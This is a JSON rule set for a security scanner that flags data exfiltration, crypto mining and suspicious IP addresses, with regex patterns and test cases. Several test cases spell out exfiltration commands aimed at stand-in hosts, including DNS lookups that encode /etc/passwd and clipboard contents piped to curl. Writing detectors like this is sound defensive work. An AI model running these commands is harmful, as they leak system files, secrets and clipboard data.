{
  "$schema": "../rule-schema.json",
  "category": "Data Exfiltration",
  "rules": [
    {
      "id": "EXFIL-001",
      "title": "Webhook/external POST",
      "description": "POST requests to external URLs may be exfiltrating data.",
      "severity": "medium",
      "pattern": "(fetch|axios|request|got|http\\.request)\\s*\\([^)]*['\"]https?://[^'\"]+['\"][^)]*['\"]POST['\"]",
      "file_extensions": ["js", "ts", "mjs", "cjs"],
      "remediation": "Audit external network requests and ensure they are expected."
    },
    {
      "id": "EXFIL-002",
      "title": "Discord/Slack/Telegram webhook",
      "description": "Webhooks to chat services are commonly used for data exfiltration.",
      "severity": "high",
      "pattern": "['\"]https://(discord\\.com/api/webhooks|hooks\\.slack\\.com|api\\.telegram\\.org)/[^'\"]+['\"]",
      "file_extensions": ["js", "ts", "mjs", "cjs", "py", "rb", "sh", "bash", "zsh", "md", "txt", "yaml", "yml"],
      "remediation": "Webhook URLs should be reviewed for legitimacy."
    },
    {
      "id": "NET-001",
      "title": "Crypto mining indicators",
      "description": "Patterns associated with cryptocurrency mining.",
      "severity": "critical",
      "pattern": "(?i)(coinhive|cryptonight|stratum\\+tcp|xmrig|minergate|hashrate)",
      "file_extensions": [],
      "remediation": "Remove cryptocurrency mining code."
    },
    {
      "id": "NET-002",
      "title": "Suspicious IP address",
      "description": "Hard-coded IP addresses may indicate C2 communication. Well-known safe IPs (localhost, private ranges, public DNS) are excluded.",
      "severity": "low",
      "pattern": "['\"]([0-9]{1,3}\\.){3}[0-9]{1,3}(:[0-9]+)?['\"]",
      "exclude_patterns": [
        "['\"]127\\.",
        "['\"]0\\.0\\.0\\.0",
        "['\"]10\\.",
        "['\"]192\\.168\\.",
        "['\"]172\\.(1[6-9]|2[0-9]|3[01])\\.",
        "['\"]169\\.254\\.",
        "['\"]1\\.1\\.1\\.1",
        "['\"]1\\.0\\.0\\.1",
        "['\"]8\\.8\\.8\\.8",
        "['\"]8\\.8\\.4\\.4",
        "['\"]9\\.9\\.9\\.9",
        "['\"]255\\."
      ],
      "file_extensions": [],
      "remediation": "Review hard-coded IP addresses for legitimacy.",
      "test_cases": {
        "should_match": [
          "\"45.33.97.12\"",
          "'203.0.113.50'",
          "\"185.220.100.240:8080\""
        ],
        "should_not_match": [
          "\"127.0.0.1\"",
          "\"0.0.0.0\"",
          "\"10.0.0.1\"",
          "\"192.168.1.1\"",
          "\"172.16.0.1\"",
          "\"169.254.1.1\"",
          "\"1.1.1.1\"",
          "\"8.8.8.8\"",
          "\"8.8.4.4\"",
          "\"9.9.9.9\"",
          "\"1.0.0.1\""
        ]
      }
    },
    {
      "id": "EXFIL-003",
      "title": "Curl/wget POST with sensitive file data",
      "description": "Using curl or wget to POST sensitive files (SSH keys, env files, credentials) to an external server.",
      "severity": "critical",
      "pattern": "(?i)(curl|wget)\\s+[^\\n]*(-d|--data|--post|--upload-file)[^\\n]*(\\.(ssh|env|aws|gnupg)|id_rsa|credentials|secret|password|token)",
      "file_extensions": ["sh", "bash", "zsh", "py", "rb", "pl", "md", "txt", "yaml", "yml"],
      "remediation": "Remove data exfiltration commands targeting sensitive files."
    },
    {
      "id": "EXFIL-004",
      "title": "File read and network send pattern",
      "description": "Reading sensitive files and sending their contents over the network.",
      "severity": "high",
      "pattern": "(readFile|readFileSync|open\\s*\\().*(\\.ssh|\\.env|\\.aws|id_rsa|credentials)[^;]*;[\\s\\S]{0,200}(fetch|axios|request|http\\.request|XMLHttpRequest|curl)",
      "file_extensions": ["js", "ts", "mjs", "cjs", "py"],
      "remediation": "Audit code that reads sensitive files and makes network requests."
    },
    {
      "id": "EXFIL-005",
      "title": "navigator.sendBeacon() exfiltration",
      "description": "sendBeacon() fires a one-shot HTTP POST that completes even if the page is closing. Commonly used for fire-and-forget data exfiltration.",
      "severity": "high",
      "pattern": "\\bnavigator\\.sendBeacon\\s*\\(",
      "file_extensions": ["js", "ts", "mjs", "cjs"],
      "remediation": "Review sendBeacon() calls. This API is designed for analytics but is frequently abused for stealthy data exfiltration.",
      "test_cases": {
        "should_match": [
          "navigator.sendBeacon('https://evil.com/log', data)",
          "navigator.sendBeacon(url, JSON.stringify(secrets))"
        ],
        "should_not_match": [
          "// navigator.sendBeacon is a Web API",
          "sendBeaconPolyfill()"
        ]
      }
    },
    {
      "id": "EXFIL-006",
      "title": "DNS-based data exfiltration",
      "description": "DNS queries with embedded data (e.g., nslookup/dig with interpolated variables) exfiltrate data through DNS resolution, bypassing most network filters.",
      "severity": "high",
      "pattern": "\\b(nslookup|dig|host|resolve|resolveDns)\\b[^\\n]*\\$[({]",
      "file_extensions": ["sh", "bash", "zsh", "py", "js", "ts", "mjs", "cjs", "rb", "pl"],
      "remediation": "Remove DNS queries that embed variable data in domain names. This is a classic data exfiltration technique that bypasses firewalls.",
      "test_cases": {
        "should_match": [
          "nslookup $(cat /etc/passwd | base64).attacker.com",
          "dig +short ${secret}.evil.com",
          "host ${data}.exfil.attacker.com"
        ],
        "should_not_match": [
          "nslookup example.com",
          "dig +short google.com",
          "host localhost"
        ]
      }
    },
    {
      "id": "EXFIL-007",
      "title": "Clipboard access",
      "description": "Accessing the system clipboard (read or write) can steal copied passwords, tokens, and sensitive data, or inject malicious content for paste attacks.",
      "severity": "medium",
      "pattern": "\\b(pbcopy|pbpaste|xclip|xsel|wl-copy|wl-paste|Get-Clipboard|Set-Clipboard|clipboard\\.readText|clipboard\\.writeText|navigator\\.clipboard)\\b",
      "file_extensions": ["sh", "bash", "zsh", "py", "js", "ts", "mjs", "cjs", "ps1", "rb"],
      "remediation": "Review clipboard access. Plugins should not read or modify the system clipboard without explicit user consent.",
      "test_cases": {
        "should_match": [
          "pbpaste | curl -d @- evil.com",
          "xclip -selection clipboard -o",
          "navigator.clipboard.readText()",
          "Get-Clipboard"
        ],
        "should_not_match": [
          "clipboardManager.clear()"
        ]
      }
    }
  ]
}
